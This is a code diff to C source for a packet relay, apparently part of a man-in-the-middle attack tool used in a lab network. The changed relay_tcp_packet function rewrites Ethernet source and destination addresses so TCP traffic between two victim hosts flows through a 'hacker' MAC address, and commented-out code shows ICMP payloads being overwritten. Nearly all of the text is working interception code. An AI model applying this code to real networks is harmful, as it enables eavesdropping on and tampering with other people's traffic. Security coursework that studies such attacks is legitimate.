@@ -384,6 +384,13 @@ void relay_icmp_packet(int sockid, unsigned char* buffer, int size,
     struct icmphdr *icmph = (struct icmphdr*)(buffer + iphdrlen + ethdrlen);
     int header_size =  sizeof(struct ethhdr) + iphdrlen + sizeof icmph;
 
+    // int z=0;
+    // print_data(stdout, buffer + header_size, size - header_size );
+    // for (z = 0; z < size - header_size; z++) {
+    //     *(buffer+header_size+z) = 'z';
+    // }
+    // print_data(stdout, buffer + header_size, size - header_size );
+
     iph->check = 0;
     iph->check = ip_checksum((unsigned short*)iph, iphdrlen);
     icmph->checksum = 0;
@@ -452,34 +459,14 @@ void relay_tcp_packet(int sockid, unsigned char* buffer, int size,
 
     if (iph->protocol != 6) return;
 
-    if (iph->saddr == inet_addr("10.9.0.5")
-        && iph->daddr== inet_addr("10.9.0.6")) {
-        eth->h_source[0] = 0X02;
-        eth->h_source[1] = 0X42;
-        eth->h_source[2] = 0X0A;
-        eth->h_source[3] = 0X09;
-        eth->h_source[4] = 0X00;
-        eth->h_source[5] = 0X69;
-        eth->h_dest[0] = 0X02;
-        eth->h_dest[1] = 0X42;
-        eth->h_dest[2] = 0X0A;
-        eth->h_dest[3] = 0X09;
-        eth->h_dest[4] = 0X00;
-        eth->h_dest[5] = 0X06;
-    } else if (iph->saddr == inet_addr("10.9.0.6")
-        && iph->daddr== inet_addr("10.9.0.5")) {
-        eth->h_source[0] = 0X02;
-        eth->h_source[1] = 0X42;
-        eth->h_source[2] = 0X0A;
-        eth->h_source[3] = 0X09;
-        eth->h_source[4] = 0X00;
-        eth->h_source[5] = 0X69;
-        eth->h_dest[0] = 0X02;
-        eth->h_dest[1] = 0X42;
-        eth->h_dest[2] = 0X0A;
-        eth->h_dest[3] = 0X09;
-        eth->h_dest[4] = 0X00;
-        eth->h_dest[5] = 0X05;
+    if (iph->saddr == inet_addr(victim_ip_1)
+        && iph->daddr== inet_addr(victim_ip_2)) {
+        memcpy(&eth->h_source, (void *)ether_aton(hacker_mac), 6);
+        memcpy(&eth->h_dest, (void *)ether_aton(victim_mac_2), 6);
+    } else if (iph->saddr == inet_addr(victim_ip_2)
+        && iph->daddr== inet_addr(victim_ip_1)) {
+        memcpy(&eth->h_source, (void *)ether_aton(hacker_mac), 6);
+        memcpy(&eth->h_dest, (void *)ether_aton(victim_mac_1), 6);
     } else {
         printf("FUCK\n");
         return;
